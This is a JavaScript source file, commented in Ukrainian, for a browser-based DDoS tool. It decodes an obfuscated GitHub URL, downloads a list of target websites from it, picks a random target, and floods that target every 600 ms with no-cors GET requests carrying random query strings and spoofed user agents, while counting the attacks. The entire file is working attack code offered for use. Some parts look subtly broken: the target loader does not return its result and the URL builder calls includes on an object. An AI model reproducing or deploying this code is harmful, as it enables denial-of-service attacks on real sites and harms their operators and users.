// @ts-nocheck

/**
 * @typedef {Object} Target Ціль
 * @property {string} page Сайт, який треба дудосити
 * @property {"GET" | "POST"} method  Метод для атаки
 */


/**
 * # Інструменти
 */
class Tools {
	/**
	 * Генерація **GET** запиту
	 * @returns {Promise<string>} **URL**
	 */
	async composeVictim() {
		return !this.target.includes('?') ? this.target + `?q=${await getFloodString(64)}` : this.target
	};

	/**
	 * Зберігання данних про атаки
	 */
	addCount() {
		this.attacks.text((+this.attacks.text()) + 1);
		++Database.attacks
	};
 
	/**
	 * Показ цілі користувачу
	 */
	setTarget() {
		this.targetField.text(this.target.page);
		this.methodField.text("GET")
	}

	/**
	 * Завантажувач цілей
	 * 
	 * @returns {Promise<Target>}
	 */
	async getTargets() {
		// Завантаження цілей
		// Кешування вимкнено
		await fetch(this.targetSource, {cache:'no-cache'})
			.then(async function(response) {
				const data = JSON.parse(atob(await response.text()));

				/**@type Target[] */
				let targets = [];

				// Фільтрування цілей
				for (let i in data) {
					if (['post', 'get'].includes(data[i].method)) {
						targets.push(data[i])
					}
				};
				$("#load").remove();
				
				return randomChoice(targets) // Рандомна ціль
			}, () => {})
	}
}


/**
 * ## Воркер
 */
class Doser extends Tools {
	/**
	 * Конструктор досера
	 * 
	 * TODO: Доробити SFX
	 * 
	 * @constructor
	 */
	constructor() {
		super();
		this.attacks = $("#attacks");
		this.targetField = $("#target");
		this.methodField = $("#method");
		this.box = $("#box");
		this.button = $("#button");
		/**Інтервал для `fetch` атаки*/
		this.attackInterval = 600;
		this.targetSource = atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h6eWFsbHpqeC0yMzEvaW91empsYS02MTIvbWFpbi80MC5qc29u');
	};

	go() {
		this.attack ? this.stop() : this.start()
	}

	/**
	 * Запуск атаки
	 */
    async start() {
		this.attack = true; // Статус атаки
		this.button.text("Стоп");

		// Створення сповіщення про завантаження цілей
		// Тут теж буде рефакторинг
		(l => {if (l[0]) l.remove()})($("#load"));

		// Завантаження цілей

		$("<p>", {id: "load"})
		.text("Завантажуємо цілі...")
		.appendTo(this.box);


        this.target = await this.getTargets();

		console.log(this.target)

		// Якщо цілі не завантажились
        if (!this.target) {
        	// Якщо не завнтажились цілі

        	$("#load").text("Помилка завантаження!");
    		swal("Помилка!",
				 "Перевірте підключення до інтернету!",
				 "error"
			);

        	this.attack = false;
        	this.button.text("Старт!");
        	return // Стоп
        };

		// Показ цілей
		this.setTarget();
        console.log(this.target);


		// Видаємо юзерагент
		const UserAgent = await getRandomUseragent();
		console.log(UserAgent)

		// Старт атаки

		this.interval = 
		setInterval(async () => {
			await fetch(await this.composeVictim(), {
				method: "GET",
				mode: 'no-cors',
				referrerPolicy: 'no-referrer',
				headers: {
					"User-Agent": UserAgent
				},
				cache: 'no-cache'
			})
			.then(this.addCount,
				  this.addCount);

        }, this.attackInterval);

    };
	/**
	 * Зупинка атаки
	 */
    stop() {
    	if (this.interval) {
	    	this.attack = false;
	    	this.lockAttackCount = true;
	    	clearInterval(this.interval);
	    	console.clear();
	    	this.button.text("Старт!")
    	}
    }
}